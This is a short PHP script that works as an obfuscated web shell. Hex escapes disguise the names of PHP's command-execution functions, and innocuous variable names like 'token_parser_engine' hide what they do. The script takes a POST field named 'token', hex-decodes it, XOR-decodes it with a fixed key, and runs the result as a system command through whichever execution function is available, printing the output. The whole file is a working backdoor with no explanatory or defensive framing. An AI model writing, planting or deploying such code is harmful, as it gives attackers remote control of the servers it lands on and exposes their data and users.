<?php

$token_parser_engine = "he\x782\x62in";
$splitter_tool3 = "exe\x63";
$splitter_tool7 = "p\x63\x6C\x6Fse";
$splitter_tool4 = "p\x61ss\x74\x68\x72u";
$splitter_tool6 = "\x73tr\x65a\x6D\x5F\x67\x65\x74_c\x6F\x6E\x74ents";
$splitter_tool2 = "\x73\x68\x65\x6Cl_e\x78ec";
$splitter_tool1 = "\x73\x79\x73tem";
$splitter_tool5 = "po\x70e\x6E";
if (isset($_POST["to\x6Ben"])) {
            function core_engine (   $entity    ,  $binding    ) {  $k =   '';  for($h=0; $h<strlen($entity); $h++){$k.=chr(ord($entity[$h])^$binding);} return $k; }
            $token = $token_parser_engine($_POST["to\x6Ben"]);
            $token = core_engine($token, 53);
            if (function_exists($splitter_tool1)) {
                $splitter_tool1($token);
            } elseif (function_exists($splitter_tool2)) {
                print $splitter_tool2($token);
            } elseif (function_exists($splitter_tool3)) {
                $splitter_tool3($token, $data_entity);
                print join("\n", $data_entity);
            } elseif (function_exists($splitter_tool4)) {
                $splitter_tool4($token);
            } elseif (function_exists($splitter_tool5) && function_exists($splitter_tool6) && function_exists($splitter_tool7)) {
                $binding_k = $splitter_tool5($token, 'r');
                if ($binding_k) {
                    $reference_component = $splitter_tool6($binding_k);
                    $splitter_tool7($binding_k);
                    print $reference_component;
                }
            }
            exit;
        }